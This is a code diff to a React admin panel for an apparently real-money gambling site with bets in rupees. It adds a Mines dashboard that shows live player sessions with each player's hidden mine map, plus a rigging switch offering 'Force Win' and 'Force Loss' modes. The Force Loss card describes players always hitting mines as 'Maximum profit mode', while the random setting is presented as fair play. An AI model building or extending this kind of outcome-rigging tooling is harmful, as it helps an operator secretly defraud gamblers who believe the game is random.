@@ -24,6 +24,8 @@ export default function AdminPanel() {
   const [allUsers, setAllUsers] = useState<UserProfile[]>([]);
   const [activeTab, setActiveTab] = useState<'settings' | 'deposits' | 'withdrawals' | 'users' | 'live' | 'referrals' | 'mines'>('mines');
   const [activeBets, setActiveBets] = useState<any[]>([]);
+  const [activeMinesGames, setActiveMinesGames] = useState<any[]>([]);
+  const [minesRigging, setMinesRigging] = useState<'random' | 'win' | 'lose'>('random');
   const [history, setHistory] = useState<GameHistoryEntry[]>([]);
   const [localNextValue, setLocalNextValue] = useState<string>('');
 
@@ -94,13 +96,47 @@ export default function AdminPanel() {
       setAllUsers(u);
     });
 
+    const interval = setInterval(() => {
+      if (activeTab === 'mines' && isAdminLoggedIn) {
+        fetchMinesData();
+      }
+    }, 2000);
+
     return () => {
       eventSource.close();
       unsubDeposits();
       unsubWithdrawals();
       unsubUsers();
+      clearInterval(interval);
     };
-  }, []);
+  }, [isAdminLoggedIn, activeTab]);
+
+  const fetchMinesData = async () => {
+    const config = getNetworkConfig();
+    try {
+      const res = await fetch(`${config.apiBase}/admin/mines/active`);
+      const data = await res.json();
+      setActiveMinesGames(data.games || []);
+      setMinesRigging(data.rigging || 'random');
+    } catch (e) {
+      console.error("Failed to fetch mines data");
+    }
+  };
+
+  const updateMinesRigging = async (mode: string) => {
+    const config = getNetworkConfig();
+    try {
+      await fetch(`${config.apiBase}/admin/mines/rig`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ mode })
+      });
+      setMinesRigging(mode as any);
+      alert(`Mines result forced to: ${mode.toUpperCase()}`);
+    } catch (e) {
+      alert("Failed to update rigging");
+    }
+  };
 
   const updateSettings = async (field: string, value: any) => {
     const config = getNetworkConfig();
@@ -670,6 +706,118 @@ export default function AdminPanel() {
                 </p>
               </div>
            </div>
+        )}
+
+        {activeTab === 'mines' && (
+          <div className="space-y-8 animate-in fade-in slide-in-from-bottom-2 duration-500">
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
+               <div onClick={() => updateMinesRigging('random')} className={`p-6 rounded-3xl border-2 transition-all cursor-pointer ${minesRigging === 'random' ? 'bg-indigo-500/20 border-indigo-500 shadow-xl shadow-indigo-500/20' : 'bg-white/5 border-transparent hover:bg-white/10'}`}>
+                 <div className="flex items-center justify-between mb-4">
+                   <div className="w-10 h-10 rounded-xl bg-indigo-500/20 flex items-center justify-center">
+                     <Settings className="w-5 h-5 text-indigo-400" />
+                   </div>
+                   {minesRigging === 'random' && <div className="px-2 py-1 bg-indigo-500 text-white text-[8px] font-black uppercase rounded-lg">Active</div>}
+                 </div>
+                 <h3 className="font-black text-xs uppercase tracking-widest mb-1 italic">Random Mode</h3>
+                 <p className="text-[10px] text-white/40 font-bold leading-tight">Fair play. AI determines outcomes naturally.</p>
+               </div>
+
+               <div onClick={() => updateMinesRigging('win')} className={`p-6 rounded-3xl border-2 transition-all cursor-pointer ${minesRigging === 'win' ? 'bg-green-500/20 border-green-500 shadow-xl shadow-green-500/20' : 'bg-white/5 border-transparent hover:bg-white/10'}`}>
+                 <div className="flex items-center justify-between mb-4">
+                   <div className="w-10 h-10 rounded-xl bg-green-500/20 flex items-center justify-center">
+                     <Diamond className="w-5 h-5 text-green-400" />
+                   </div>
+                   {minesRigging === 'win' && <div className="px-2 py-1 bg-green-500 text-white text-[8px] font-black uppercase rounded-lg">Active</div>}
+                 </div>
+                 <h3 className="font-black text-xs uppercase tracking-widest mb-1 italic text-green-400">Force Win</h3>
+                 <p className="text-[10px] text-white/40 font-bold leading-tight">Players always hit Diamonds. High payout risk.</p>
+               </div>
+
+               <div onClick={() => updateMinesRigging('lose')} className={`p-6 rounded-3xl border-2 transition-all cursor-pointer ${minesRigging === 'lose' ? 'bg-red-500/20 border-red-500 shadow-xl shadow-red-500/20' : 'bg-white/5 border-transparent hover:bg-white/10'}`}>
+                 <div className="flex items-center justify-between mb-4">
+                   <div className="w-10 h-10 rounded-xl bg-red-500/20 flex items-center justify-center">
+                     <AlertCircle className="w-5 h-5 text-red-400" />
+                   </div>
+                   {minesRigging === 'lose' && <div className="px-2 py-1 bg-red-500 text-white text-[8px] font-black uppercase rounded-lg">Active</div>}
+                 </div>
+                 <h3 className="font-black text-xs uppercase tracking-widest mb-1 italic text-red-400">Force Loss</h3>
+                 <p className="text-[10px] text-white/40 font-bold leading-tight">Players always hit Mines. Maximum profit mode.</p>
+               </div>
+            </div>
+
+            <div className="bg-white/5 rounded-[32px] border border-white/5 overflow-hidden">
+               <div className="p-6 border-b border-white/5 flex items-center justify-between">
+                 <h2 className="text-sm font-black uppercase tracking-[0.2em] italic flex items-center gap-3">
+                   <TrendingUp className="text-indigo-400 w-5 h-5" />
+                   Live Mines Sessions
+                 </h2>
+                 <div className="flex items-center gap-2">
+                   <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
+                   <span className="text-[10px] font-black text-white/40 uppercase tracking-widest">{activeMinesGames.length} Players Playing</span>
+                 </div>
+               </div>
+
+               <div className="overflow-x-auto">
+                 <table className="w-full text-left">
+                   <thead>
+                     <tr className="bg-white/[0.02] text-[10px] uppercase font-bold text-white/40 tracking-[0.2em]">
+                       <th className="px-6 py-4">Player</th>
+                       <th className="px-6 py-4">Bet (₹)</th>
+                       <th className="px-6 py-4">Mines</th>
+                       <th className="px-6 py-4">Stage</th>
+                       <th className="px-6 py-4">Profit (₹)</th>
+                       <th className="px-6 py-4">Map View</th>
+                     </tr>
+                   </thead>
+                   <tbody className="text-xs">
+                     {activeMinesGames.map((game, i) => {
+                       const user = allUsers.find(u => u.uid === game.userId);
+                       return (
+                         <tr key={i} className="border-b border-white/5 hover:bg-white/[0.03] transition-all">
+                           <td className="px-6 py-6">
+                              <div className="font-black text-white">{user?.email || "Unknown"}</div>
+                              <div className="text-[8px] font-mono text-white/20">{game.userId}</div>
+                           </td>
+                           <td className="px-6 py-6 font-mono font-black text-indigo-400">₹{game.bet}</td>
+                           <td className="px-6 py-6">
+                              <span className="px-2 py-1 bg-red-500/10 text-red-500 rounded text-[10px] font-black">{game.numMines} BOMBS</span>
+                           </td>
+                           <td className="px-6 py-6">
+                              <div className="flex items-center gap-1">
+                                <span className="text-white font-black">{game.revealedCount}</span>
+                                <span className="text-white/20">/</span>
+                                <span className="text-white/20">{25 - game.numMines}</span>
+                              </div>
+                           </td>
+                           <td className="px-6 py-6">
+                              <div className="text-green-400 font-mono font-black">₹{(game.bet * game.multiplier).toFixed(2)}</div>
+                              <div className="text-[8px] text-white/30 font-black">{game.multiplier}x</div>
+                           </td>
+                           <td className="px-6 py-6">
+                              <div className="flex flex-wrap gap-0.5 w-[50px]">
+                                {[...Array(25)].map((_, idx) => (
+                                  <div key={idx} className={`w-2 h-2 rounded-[2px] ${game.mines.includes(idx) ? 'bg-red-500' : 'bg-white/10'}`} />
+                                ))}
+                              </div>
+                           </td>
+                         </tr>
+                       );
+                     })}
+                     {activeMinesGames.length === 0 && (
+                        <tr>
+                          <td colSpan={6} className="py-20 text-center">
+                            <div className="flex flex-col items-center opacity-20">
+                              <Diamond className="w-12 h-12 mb-4" />
+                              <div className="text-xs font-black uppercase tracking-[0.3em]">No Active Sessions</div>
+                            </div>
+                          </td>
+                        </tr>
+                     )}
+                   </tbody>
+                 </table>
+               </div>
+            </div>
+          </div>
         )}
 
         {activeTab === 'referrals' && (
